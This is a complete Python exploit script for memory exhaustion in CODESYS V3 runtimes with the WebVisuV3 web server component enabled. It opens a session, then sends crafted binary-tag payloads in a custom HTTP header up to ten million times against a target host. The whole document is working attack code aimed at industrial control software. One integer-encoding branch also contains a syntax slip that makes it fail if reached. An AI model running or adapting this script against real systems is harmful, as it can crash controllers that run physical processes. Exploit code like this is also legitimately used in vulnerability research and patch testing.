import sys, base64, requests, binascii, argparse 
from struct import pack
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

''' Only support protocol 0xCD55'''
def layer7(svc_group, svc_num, sess_id, data):

  hdr  = pack('<HHII',svc_group, svc_num, sess_id, len(data))
  hdr += pack('<HH', 0, 0) 

  pdu  = pack('<HH',0xcd55, len(hdr))
  pdu += hdr 
  pdu += data # Layer7 body 

  return pdu

def btag_encode_int(val):
  # 7 bits
  if(val <= 0x7f):
    return pack('B',val)
  # 14 bits
  elif (val <= 0x3fff):
    return pack('BB',(val & 0x7f) | 0x80, (val >> 7) & 0x7f)
  # 21 bits
  elif (val <= 0x1fffff):
    return pack('BBB', 
      (val & 0x7f) | 0x80, 
      ((val >> 7)  | 0x80) & 0xff, 
      (val >> 14) & 0x7f
    )
  # 28 bits
  elif (val <= 0xfffffff):
    return pack('BBBB'
      (val & 0x7f)   | 0x80, 
      ((val >> 7)    | 0x80) & 0xff, 
      ((val >> 14)   | 0x80) & 0xff,
      (val >> 21) & 0x7f 
    )
  # TODO: encode larger int
  else:
    raise ValueError('Value too big to encode.')

def btag(id, value):
  tag  = btag_encode_int(id)         # Tag id 
  tag += btag_encode_int(len(value)) # Tag length
  tag += value                       # Tag value 
  
  return tag 

descr  = 'This script leaks memory in a CODESYS V3 runtime with '
descr += 'component CmpWebServerHandlerV3 enabled.'
 
parser = argparse.ArgumentParser(descr)
parser.add_argument('host', help='Target host')
parser.add_argument('port', type=int, default=8080, nargs='?', 
  help='Target port, (default: %(default)s)')
parser.add_argument('--tls', dest ='tls',action ='store_true',
  help='Use TLS (slow leaking)')


args = parser.parse_args()
host = args.host
port = args.port
tls  = args.tls

scheme = 'http'
if tls: scheme = 'https'

url = '%s://%s:%d/WebVisuV3' % (scheme, host, port)
print('Attacking %s' % (url))

print('Sending WEB_CLIENT_OPENCONNECTION...')
open_conn = base64.b64encode(pack('<L', 1) + b'|foo|65536|true|')
headers = {'Connection':'keep-alive', '3S-Repl-Content':open_conn}
r = requests.post(url, headers=headers, verify=False) 
if r.status_code != 200:
  sys.exit('WEB_CLIENT_OPENCONNECTION failed')
print(r.text)

print('Sending WEB_CLIENT_RUN_SERVICE requests to leak memory...')

# Create 2 binary tags; only memory for last tag is freed.
#
# Change <cnt> to something smaller if needed to avoid exceeding
# the max size for http headers.
cnt = 0x240
if tls: cnt = 0x80
tags = b'' 
for n in (cnt, 1):
  items = b''
  for i in range(n):
    items += pack('<H', 0xffff) + b'A' * 0x52
    
  extSize = n * 0x54 + 8; 
  app  = b'APP\x00'; 
  app += b'\x00' * ((4 - len(app) % 4) % 4)
  data  = app 
  data += pack('<LLL', 0xffffffff, extSize, n)
  data += items;
  tags += btag(0x1, data)
  
layer7 = layer7(4, 1, 0xabcd, tags)
run_svc = pack('<L',2) + layer7
run_svc  = base64.b64encode(run_svc)
headers = {'Connection':'keep-alive', '3S-Repl-Content':run_svc}
r = requests.post(url, headers=headers, verify=False) 

for i in range(1,10000000):
  r = requests.post(url, headers=headers, verify=False) 
  if (i % 100 == 0):
    print('Requests sent: %d, last http status: %d' % (i, r.status_code), end='\r')

